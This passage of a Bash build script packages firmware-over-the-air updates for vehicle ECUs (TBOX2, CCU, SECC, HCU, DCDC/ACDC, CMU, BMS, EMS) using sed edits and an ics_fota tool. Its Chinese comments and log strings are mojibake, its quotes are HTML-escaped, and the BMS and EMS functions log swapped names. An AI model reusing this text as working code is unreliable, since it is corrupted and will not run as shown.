&quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_TBOX1.tar.gz unset latest_dir } # æ‰“åŒ…TBOX2 funPackageTBOX2(){ echo &quot;å¼€å§‹æ‰“åŒ…TBOX2&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†TB2.tar.gzæ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/TB2*.tar.gz ./module/ # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥TB2*.tar.gzç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ tbox2_tar_file=$(cd ./module &amp;&amp; ls TB2*.tar.gz) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥CCUç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/TBOX2-MPU = \\&quot;\\&quot;/TBOX2-MPU = \\&quot;$tbox2_tar_file\\&quot;/g&quot; config_fota.txt # ç”Ÿæˆbinæ–‡ä»¶åï¼ŒæŒ‡å®šconfig_fotaæ–‡ä»¶ç¬¬äºŒæ¬¡æ‰“åŒ… ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_TBOX2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_TBOX2.log; then echo &quot;æ•æ‰åˆ°ics_fota_TBOX2æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_TBOX2.tar.gz unset latest_dir } # æ‰“åŒ…CCU funPackageCCU(){ echo &quot;å¼€å§‹æ‰“åŒ…CCU&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†ccu.s19æ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/CCU*.s19 ./module/ # æ‰§è¡Œics_fotaå‘½ä»¤ echo &quot;å¼€å§‹ç”Ÿæˆ.binæ–‡ä»¶&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_CCU_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_CCU_1.log; then echo &quot;æ•æ‰åˆ°ics_fota_CCU_1æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥.binç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ ccu_bin_file1=$(cd ./module &amp;&amp; ls CCU1*.bin) ccu_bin_file2=$(cd ./module &amp;&amp; ls CCU2*.bin) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥CCUç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/CCU1 = \\&quot;\\&quot;/CCU1 = \\&quot;$ccu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CCU2 = \\&quot;\\&quot;/CCU2 = \\&quot;$ccu_bin_file2\\&quot;/g&quot; config_fota.txt # ç”Ÿæˆbinæ–‡ä»¶åï¼ŒæŒ‡å®šconfig_fotaæ–‡ä»¶ç¬¬äºŒæ¬¡æ‰“åŒ… ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_CCU_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_CCU_2.log; then echo &quot;æ•æ‰åˆ°ics_fota_CCU_2æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_CCU.tar.gz unset latest_dir } # æ‰“åŒ…SECC funPackageSECC(){ echo &quot;å¼€å§‹æ‰“åŒ…SECC&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†secc.s19æ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/SECC*.s19 ./module/ # æ‰§è¡Œics_fotaå‘½ä»¤ echo &quot;å¼€å§‹ç”Ÿæˆ.binæ–‡ä»¶&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_SECC_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_SECC_1.log; then echo &quot;æ•æ‰åˆ°ics_fota_SECC_1æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥.binç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ secc_bin_file1=$(cd ./module &amp;&amp; ls SECC1*.bin) secc_bin_file2=$(cd ./module &amp;&amp; ls SECC2*.bin) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥CCUç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/SECC1 = \\&quot;\\&quot;/SECC1 = \\&quot;$secc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/SECC2 = \\&quot;\\&quot;/SECC2 = \\&quot;$secc_bin_file2\\&quot;/g&quot; config_fota.txt # ç”Ÿæˆbinæ–‡ä»¶åï¼ŒæŒ‡å®šconfig_fotaæ–‡ä»¶ç¬¬äºŒæ¬¡æ‰“åŒ… ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_SECC_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_SECC_2.log; then echo &quot;æ•æ‰åˆ°ics_fota_SECC_2æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_SECC.tar.gz unset latest_dir } # æ‰“åŒ…HCU funPackageHCU(){ echo &quot;å¼€å§‹æ‰“åŒ…HCU&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†AFC.hexæ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/AFC*.hex ./module/ # æ‰§è¡Œics_fotaå‘½ä»¤ echo &quot;å¼€å§‹ç”Ÿæˆ.binæ–‡ä»¶&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_HCU_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_HCU_1.log; then echo &quot;æ•æ‰åˆ°ics_fota_HCU_1æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥.binç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ hcu_bin_file1=$(cd ./module &amp;&amp; ls HCU*.bin) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥CCUç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/HCU = \\&quot;\\&quot;/HCU = \\&quot;$hcu_bin_file1\\&quot;/g&quot; config_fota.txt # ç”Ÿæˆbinæ–‡ä»¶åï¼ŒæŒ‡å®šconfig_fotaæ–‡ä»¶ç¬¬äºŒæ¬¡æ‰“åŒ… ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_HCU_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_HCU_2.log; then echo &quot;æ•æ‰åˆ°ics_fota_HCU_2æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_HCU.tar.gz unset latest_dir } # æ‰“åŒ…DCDCå’ŒACDC funPackagePM(){ echo &quot;å¼€å§‹æ‰“åŒ…DCDCå’ŒACDC&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†ac*.hexå’Œdc*.hexæ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/AC*.hex ./module/ cp ./FotaPackageTool/module_tmp/DC*.hex ./module/ # æ‰§è¡Œics_fotaå‘½ä»¤ echo &quot;å¼€å§‹ç”Ÿæˆ.binæ–‡ä»¶&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_PM_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_PM_1.log; then echo &quot;æ•æ‰åˆ°ics_fota_PM_1æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥.binç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ dc_bin_file1=$(cd ./module &amp;&amp; ls DCDC1*.bin) dc_bin_file2=$(cd ./module &amp;&amp; ls DCDC2*.bin) dc_bin_file3=$(cd ./module &amp;&amp; ls DCDC3*.bin) dc_bin_file4=$(cd ./module &amp;&amp; ls DCDC4*.bin) ac_bin_file1=$(cd ./module &amp;&amp; ls ACDC1*.bin) ac_bin_file2=$(cd ./module &amp;&amp; ls ACDC2*.bin) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥CCUç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/DCCC1 = \\&quot;\\&quot;/DCCC1 = \\&quot;$dc_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCCC2 = \\&quot;\\&quot;/DCCC2 = \\&quot;$dc_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCCC3 = \\&quot;\\&quot;/DCCC3 = \\&quot;$dc_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/DCCC4 = \\&quot;\\&quot;/DCCC4 = \\&quot;$dc_bin_file4\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACCC1 = \\&quot;\\&quot;/ACCC1 = \\&quot;$ac_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/ACCC2 = \\&quot;\\&quot;/ACCC2 = \\&quot;$ac_bin_file2\\&quot;/g&quot; config_fota.txt # ç”Ÿæˆbinæ–‡ä»¶åï¼ŒæŒ‡å®šconfig_fotaæ–‡ä»¶ç¬¬äºŒæ¬¡æ‰“åŒ… ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_PM_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_PM_2.log; then echo &quot;æ•æ‰åˆ°ics_fota_PM_2æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_PM.tar.gz unset latest_dir } # æ‰“åŒ…CMU funPackageCMU(){ echo &quot;å¼€å§‹æ‰“åŒ…CMU&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†cmu.hexæ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/CMU*.hex ./module/ # æ‰§è¡Œics_fotaå‘½ä»¤ echo &quot;å¼€å§‹ç”Ÿæˆ.binæ–‡ä»¶&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_CMU_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_CMU_1.log; then echo &quot;æ•æ‰åˆ°ics_fota_CMU_1æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥.binç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ cmu_bin_file1=$(cd ./module &amp;&amp; ls CMU1*.bin) cmu_bin_file2=$(cd ./module &amp;&amp; ls CMU2*.bin) cmu_bin_file3=$(cd ./module &amp;&amp; ls CMU3*.bin) cmu_bin_file4=$(cd ./module &amp;&amp; ls CMU4*.bin) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥CCUç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/CMU1 = \\&quot;\\&quot;/CMU1 = \\&quot;$cmu_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU2 = \\&quot;\\&quot;/CMU2 = \\&quot;$cmu_bin_file2\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU3 = \\&quot;\\&quot;/CMU3 = \\&quot;$cmu_bin_file3\\&quot;/g&quot; config_fota.txt sed -i &quot;s/CMU4 = \\&quot;\\&quot;/CMU4 = \\&quot;$cmu_bin_file4\\&quot;/g&quot; config_fota.txt # ç”Ÿæˆbinæ–‡ä»¶åï¼ŒæŒ‡å®šconfig_fotaæ–‡ä»¶ç¬¬äºŒæ¬¡æ‰“åŒ… ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_CMU_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_CMU_2.log; then echo &quot;æ•æ‰åˆ°ics_fota_CMU_2æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_CMU.tar.gz unset latest_dir } # æ‰“åŒ…BMS funPackageBMS(){ echo &quot;å¼€å§‹æ‰“åŒ…EMS&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†bmu.s19æ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/BMU*.s19 ./module/ # æ‰§è¡Œics_fotaå‘½ä»¤ echo &quot;å¼€å§‹ç”Ÿæˆ.binæ–‡ä»¶&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_BMS_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_BMS_1.log; then echo &quot;æ•æ‰åˆ°ics_fota_BMS_1æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥.binç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ bms_bin_file1=$(cd ./module &amp;&amp; ls BMS1*.bin) bms_bin_file2=$(cd ./module &amp;&amp; ls BMS2*.bin) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥CCUç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/BMS1 = \\&quot;\\&quot;/BMS1 = \\&quot;$bms_bin_file1\\&quot;/g&quot; config_fota.txt sed -i &quot;s/BMS2 = \\&quot;\\&quot;/BMS2 = \\&quot;$bms_bin_file2\\&quot;/g&quot; config_fota.txt # ç”Ÿæˆbinæ–‡ä»¶åï¼ŒæŒ‡å®šconfig_fotaæ–‡ä»¶ç¬¬äºŒæ¬¡æ‰“åŒ… ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_BMS_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_BMS_2.log; then echo &quot;æ•æ‰åˆ°ics_fota_BMS_2æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_BMS.tar.gz unset latest_dir } # æ‰“åŒ…EMS funPackageEMS(){ echo &quot;å¼€å§‹æ‰“åŒ…BMS&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†bmu.s19æ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/EMS*.s19 ./module/ # æ‰§è¡Œics_fotaå‘½ä»¤ echo &quot;å¼€å§‹ç”Ÿæˆ.binæ–‡ä»¶&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_EMS_1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_EMS_1.log; then echo &quot;æ•æ‰åˆ°ics_fota_EMS_1æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥.binç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ ems_bin_file1=$(cd ./module &amp;&amp; ls EMS*.bin) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥EMSç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/EMS = \\&quot;\\&quot;/EMS = \\&quot;$ems_bin_file1\\&quot;/g&quot; config_fota.txt # ç”Ÿæˆbinæ–‡ä»¶åï¼ŒæŒ‡å®šconfig_fotaæ–‡ä»¶ç¬¬äºŒæ¬¡æ‰“åŒ… ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_EMS_2.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_EMS_2.log; then echo &quot;æ•æ‰åˆ°ics_fota_EMS_2æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_EMS.tar.gz unset latest_dir } # æ‰“åŒ…æ‰€æœ‰ funPackageALL(){ echo &quot;å¼€å§‹æ‰“åŒ…å…¨éƒ¨&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†binfilesä¸­çš„.binå’Œtar.gzå’Œ.zipæ‹·è´åˆ°moduleç›®å½• cp ./FotaPackageTool/binfiles/* ./module # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥å…¨éƒ¨ECUç‰ˆæœ¬çš„æ–‡ä»¶å hmi_tar_file=$(cd ./module &amp;&amp; ls hmi*.tar) mpu_zip_file=$(cd ./module &amp;&amp; ls update.zip) mcu_bin_file1=$(cd ./module &amp;&amp; ls TBOX1*.bin) tbox2_tar_file=$(cd ./module &amp;&amp; ls TB2*.tar.gz) ccu_bin_file1=$(cd ./module &amp;&amp; ls CCU1*.bin) ccu_bin_file2=$(cd ./module &amp;&amp; ls CCU2*.bin) secc_bin_file1=$(cd ./module &amp;&amp; ls 